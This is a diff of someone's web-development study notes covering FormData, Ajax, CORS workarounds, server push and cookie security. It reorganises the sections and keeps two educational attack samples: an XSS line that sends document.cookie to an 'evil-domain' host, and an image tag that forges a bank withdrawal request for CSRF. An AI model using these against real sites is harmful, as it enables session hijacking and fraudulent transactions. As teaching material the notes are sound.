@@ -2593,6 +2593,25 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
    - interface: `Event`
    - order of `blur` and `change`: not strictly defined???
 
+1. `FormData`
+   - provides a way to easily construct a set of key/value pairs representing form fields and their values
+     - name: string
+     - value: `USVString`, `Blob` (`File`)
+   - cannot apply `JSON.stringify()`
+   - It uses the same format a form would use if the encoding type were set to `"multipart/form-data"`
+   - `for (var p of myFormData)` is equivalent to `for (var p of myFormData.entries())`
+   - constructor: `FormData(form?: HTMLFormElement)`
+   - methods
+     - `FormData.append(name, value, filename?: string): void` — Appends a new value onto an existing key inside a FormData object, or adds the key if it does not already exist
+     - `FormData.delete(name): void` — Deletes a key/value pair from a FormData object
+     - `FormData.entries(): IterableIterator<[string, FormDataEntryValue]>` — Returns an `iterator` allowing to go through all key/value pairs contained in this object
+     - `FormData.get(name): FormDataEntryValue` — Returns the first value associated with a given key from within a FormData object
+     - `FormData.getAll(name): FormDataEntryValue[]` — Returns an array of all the values associated with a given key from within a FormData
+     - `FormData.has(name): boolean` — Returns a boolean stating whether a FormData object contains a certain key/value pair
+     - `FormData.keys(): IterableIterator<string>` — Returns an `iterator` allowing to go through all keys of the key/value pairs contained in this object
+     - `FormData.set(name, value, filename?: string): void` — Sets a new value for an existing key inside a FormData object, or adds the key/value if it does not already exist
+     - `FormData.values(): IterableIterator<FormDataEntryValue>` — Returns an `iterator` allowing to go through all values of the key/value pairs contained in this object
+
 ### Scripting Text Boxes
 
 1. text boxes
@@ -3265,12 +3284,12 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
 
 ## Ajax and Comet
 
-### XMLHttpRequest, FormData
+### Ajax
 
-1. Ajax, short for Asynchronous JavaScript+XML
-   - Prior to the introduction of XHR, Ajax-style communication had to be accomplished through a number of hacks, mostly using hidden frames or iframes
-   - Make requests to the server without reloading the page
-   - Receive and work with data from the server
+1. Ajax, short for Asynchronous JavaScript+XML — `XMLHttpRequest` (XHR)
+   - hacks before `XMLHttpRequest` — mostly using hidden frames or iframes
+   - no reloading — make requests to the server without reloading the page
+   - can be asynchronous or synchronous
 
 1. `XMLHttpRequest`
    - Despite its name, XMLHttpRequest can be used to retrieve any type of data, not just XML, and it supports protocols other than HTTP (including file and ftp)
@@ -3362,25 +3381,6 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
      - returns `true` if the user agent is able to successfully queue the data for transfer
      - on IE support
 
-1. `FormData`
-   - provides a way to easily construct a set of key/value pairs representing form fields and their values
-     - name: string
-     - value: `USVString`, `Blob` (`File`)
-   - cannot apply `JSON.stringify()`
-   - It uses the same format a form would use if the encoding type were set to `"multipart/form-data"`
-   - `for (var p of myFormData)` is equivalent to `for (var p of myFormData.entries())`
-   - constructor: `FormData(form?: HTMLFormElement)`
-   - methods
-     - `FormData.append(name, value, filename?: string): void` — Appends a new value onto an existing key inside a FormData object, or adds the key if it does not already exist
-     - `FormData.delete(name): void` — Deletes a key/value pair from a FormData object
-     - `FormData.entries(): IterableIterator<[string, FormDataEntryValue]>` — Returns an `iterator` allowing to go through all key/value pairs contained in this object
-     - `FormData.get(name): FormDataEntryValue` — Returns the first value associated with a given key from within a FormData object
-     - `FormData.getAll(name): FormDataEntryValue[]` — Returns an array of all the values associated with a given key from within a FormData
-     - `FormData.has(name): boolean` — Returns a boolean stating whether a FormData object contains a certain key/value pair
-     - `FormData.keys(): IterableIterator<string>` — Returns an `iterator` allowing to go through all keys of the key/value pairs contained in this object
-     - `FormData.set(name, value, filename?: string): void` — Sets a new value for an existing key inside a FormData object, or adds the key/value if it does not already exist
-     - `FormData.values(): IterableIterator<FormDataEntryValue>` — Returns an `iterator` allowing to go through all values of the key/value pairs contained in this object
-
 ### Progress Events
 
 1. `ProgressEvent`
@@ -3409,7 +3409,7 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
    - The download events are fired on the `XMLHttpRequest` object itself, the upload events are fired on the `XMLHttpRequest.upload` object
    - Progress events are not available for the `file:` protocol
 
-### Cross-Origin Resource Sharing (CORS)
+### CORS
 
 1. Cross-Origin Resource Sharing (CORS)
    - a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin
@@ -3464,7 +3464,7 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
      - When responding to a credentialed request, the server must specify an origin in the value of the Access-Control-Allow-Origin header, instead of specifying the "*" wildcard
      - cookies set in CORS responses are subject to normal third-party cookie policies, cookies set with Set-Cookie header would thus not be saved if the user has configured their browser to reject all third-party cookies
 
-### Alternate Cross-Domain Techniques
+### Bypass CORS
 
 1. Image Pings
    ```javascript
@@ -3489,38 +3489,95 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
    ```
    - unsafe
 
-1. refresh data from server
-   - short polling: where the browser sends a request to the server in regular intervals to see if there’s any data
-     ```javascript
-     (function poll(){
-       setTimeout(function(){
-         $.ajax({ url: "server", success: function(data){
-           //Update your dashboard gauge
-           salesGauge.setValue(data.value);
-           //Setup the next poll recursively
-           poll();
-         }, dataType: "json"});
-       }, 30000);
-     })();
+1. Server Proxy: 服务器代理，顾名思义，当你需要有跨域的请求操作时发送请求给后端，让后端帮你代为请求，然后最后将获取的结果发送给你。
+
+1. `WebSocket`
+
+1. iframe 信息传递
+   - `location.hash`，改变 hash 值不会导致页面刷新，所以可以利用 hash 值来进行数据的传递，当然数据量是有限的。
+     - 假设 localhost:8080 下有文件 cs1.html 要和 localhost:8081 下的 cs2.html 传递消息，cs1.html 首先创建一个隐藏的 iframe，iframe 的 src 指向 localhost:8081/cs2.html#data，这时的 hash 值就可以做参数传递。
+   - `window.name` — 在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）
+     ```JavaScript
+     // code on a.html
+     ifr.onload = function() { // this points to b.html
+         ifr.onload = function() { // points to c.html
+             data = ifr.contentWindow.name;
+             console.log('收到数据:', data);
+         }
+         ifr.src = "http://localhost:8080/c.html"; // something origin-source as a.html
+     }
      ```
-   - Long polling, aka. comet, flips short polling around: The page initiates a request to the server and the server holds that connection open until it has data to send
-     ```javascript
-     (function poll(){
+
+1. Cross-document messaging, XDM
+   - a `MessageEvent` is dispatched at the target window when message posted
+   - `Window.postMessage(message: any, targetOrigin: string, transfer?: any[]): void`
+     - obtain `window` reference
+       - `Window.open()` (to spawn a new window and then reference it),
+       - `Window.opener` (to reference the window that spawned this one),
+       - `HTMLIFrameElement.contentWindow` (to reference an embedded `<iframe>` from its parent window),
+       - `Window.parent` (to reference the parent window from within an embedded `<iframe>),` or
+       - `Window.frames` + an index value (named or numeric)
+     - `message` — Data to be sent to the other window. The data is serialized using the structured clone algorithm
+     - `targetOrigin` — Specifies what the origin of targetWindow must be for the event to be dispatched
+       - a URI or `"*"` for any
+       - Failing to provide a specific target discloses the data you send to any interested malicious site
+       - posting a message to a page at a `file:` URL currently requires that the `targetOrigin` argument be `"*"`
+     - `transfer` — Is a sequence of `Transferable` objects that are transferred with the message
+       - The ownership of these objects is given to the destination side and they are no longer usable on the sending side
+       - The `ArrayBuffer`, `MessagePort` and `ImageBitmap` types implement this interface
+   - The structured clone algorithm
+     - defined by the HTML5 specification for copying complex JavaScript objects
+     - can avoid infinitely traversing cycles
+     - `DATA_CLONE_ERR` exception
+       - `Error` and `Function` objects
+       - `Symbol`
+       - DOM nodes
+     - Certain parameters of objects are not preserved:
+       - The `lastIndex` field of `RegExp` objects is not preserved.
+       - Property descriptors, setters, and getters (as well as similar metadata-like features) are not duplicated. For example, if an object is marked read-only using a property descriptor, it will be read-write in the duplicate, since that's the default condition.
+       - The prototype chain does not get walked and duplicated
+   - handle the event: see [events](#sec-message-events)
+   - schedules the `MessageEvent` to be dispatched only after all pending execution contexts have finished
+     - For example, if `postMessage()` is invoked in an event handler, that event handler will run to completion, as will any remaining handlers for that same event, before the `MessageEvent` is dispatched
+
+1. document.domain：对于主域相同而子域不同的情况下，可以通过设置 document.domain 的办法来解决，具体做法是可以在 `http://www.example.com/a.html` 和 `http://sub.example.com/b.html` 两个文件分别加上 document.domain = "a.com"；然后通过 a.html 文件创建一个 iframe，去控制 iframe 的 window，从而进行交互，当然这种方法只能解决主域相同而二级域名不同的情况
+
+### Server Push
+
+1. short polling — where the browser sends a request to the server in regular intervals to see if there’s any data
+   ```javascript
+   (function poll(){
+     setTimeout(function(){
        $.ajax({ url: "server", success: function(data){
          //Update your dashboard gauge
          salesGauge.setValue(data.value);
-       }, dataType: "json", complete: poll, timeout: 30000 });
-     })();
-     ```
-     - Once the data is sent, the connection is closed by the browser and a new connection is immediately opened up to the server
-     - timeout problem
-     - the HTTP specification requiring browsers to limit simultaneous connections to two per hostname, the limitation is removed in 2014, but browsers still has the cap, higher than 2 though
-   - HTTP streaming — use `Transfer Encoding: chunked` header to indicate data is sent in a series of chunks, originally used to indicate the `Content-Length` is uncertain and omitted
-     - uses a single HTTP connection for the entire lifetime of the page
-     - The browser sends a request to the server and the server holds that connection open, periodically sending data through the connection to the server
-     - printing to the output buffer and then flushing (sending the contents of the output buffer to the client). This is the core of HTTP streaming
-     - client side: listening for the `readystatechange` event and focusing on `readyState` 3, keep track of the progress and slice the response
-   - `WebSocket` and server-sent events
+         //Setup the next poll recursively
+         poll();
+       }, dataType: "json"});
+     }, 30000);
+   })();
+   ```
+
+1. long polling, aka. comet — flips short polling around: The page initiates a request to the server and the server holds that connection open until it has data to send
+   ```javascript
+   (function poll(){
+     $.ajax({ url: "server", success: function(data){
+       //Update your dashboard gauge
+       salesGauge.setValue(data.value);
+     }, dataType: "json", complete: poll, timeout: 30000 });
+   })();
+   ```
+   - Once the data is sent, the connection is closed by the browser and a new connection is immediately opened up to the server
+   - timeout problem
+   - the HTTP specification requiring browsers to limit simultaneous connections to two per hostname, the limitation is removed in 2014, but browsers still has the cap, higher than 2 though
+
+1. HTTP streaming — use `Transfer Encoding: chunked` header to indicate data is sent in a series of chunks, originally used to indicate the `Content-Length` is uncertain and omitted
+   - uses a single HTTP connection for the entire lifetime of the page
+   - The browser sends a request to the server and the server holds that connection open, periodically sending data through the connection to the server
+   - printing to the output buffer and then flushing (sending the contents of the output buffer to the client). This is the core of HTTP streaming
+   - client side: listening for the `readystatechange` event and focusing on `readyState` 3, keep track of the progress and slice the response
+
+1. `WebSocket` and server-sent events
 
 #### Server-Sent Events (SSE)
 
@@ -3677,18 +3734,6 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
    - properties and methods
      - [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Body)
 
-### Security
-
-1. prevent cross-site request forgery (CSRF) attack
-   - Requiring SSL to access resources that can be requested via XHR
-   - Requiring a computed token to be sent along with every request
-
-1. the following are ineffective against CSRF attacks
-   - Requiring a POST instead of a GET — This is easily changed
-   - Using the referrer as a determination of origin — Referrers are easily spoofed
-   - Validating based on cookie information — Also easily spoofed
-   - use `XMLHttpRequest.open()` with username and password
-
 ## Offline Applications and Client-Side Storage
 
 ### Offline App
@@ -3805,30 +3850,39 @@ CSS Object Model (CSSOM) View Module: WD Working Draft
      }
      ```
 
-1. cookie security
-   - Session hijacking and XSS
-     - Cookies are often used in web application to identify a user and their authenticated session
-     - stealing a cookie can lead to hijacking the authenticated user's session
-     - The `HttpOnly` cookie attribute can help to mitigate this attack
-     - exploiting an XSS vulnerability in the application
-       ```javascript
-       (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
-       ```
-   - Cross-site request forgery (CSRF)
-     - prevent
-       - As with XSS, input filtering is important
-       - There should always be a confirmation required for any sensitive action
-       - Cookies that are used for sensitive actions should have a short lifetime only
-       - For more prevention tips, see the [OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)
-     - for example, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money. Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image
-       ```html
-       <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
-       ```
-   - Tracking and privacy
-     - third-party cookies are mainly used for advertising and tracking across the web
-     - Do-Not-Track: `DNT` request header, but not effective
-     - persistent cookie: [evercookie](https://github.com/samyk/evercookie)
+##### cookie security
+
+1. Session hijacking and XSS
+   - Cookies are often used in web application to identify a user and their authenticated session
+   - stealing a cookie can lead to hijacking the authenticated user's session
+   - The `HttpOnly` cookie attribute can help to mitigate this attack
+   - exploiting an XSS vulnerability in the application
+     ```javascript
+     (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+     ```
+
+1. Tracking and privacy
+   - third-party cookies are mainly used for advertising and tracking across the web
+   - Do-Not-Track: `DNT` request header, but not effective
+   - persistent cookie: [evercookie](https://github.com/samyk/evercookie)
    - space and number restrictions on cookies???
+
+1. Cross-site request forgery (CSRF)
+   - prevent
+     - As with XSS, input filtering is important
+     - There should always be a confirmation required for any sensitive action
+     - Cookies that are used for sensitive actions should have a short lifetime only
+     - For more prevention tips, see the [OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)
+     - Requiring a computed token to be sent along with every request and requiring SSL to access resources that can be requested via XHR
+   - for example, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money. Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image
+     ```html
+     <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+     ```
+   - the following are ineffective against CSRF attacks
+      - Requiring a POST instead of a GET — This is easily changed
+      - Using the referrer as a determination of origin — Referrers are easily spoofed
+      - Validating based on cookie information — Also easily spoofed
+      - use `XMLHttpRequest.open()` with username and password
 
 #### Internet Explorer User Data
 
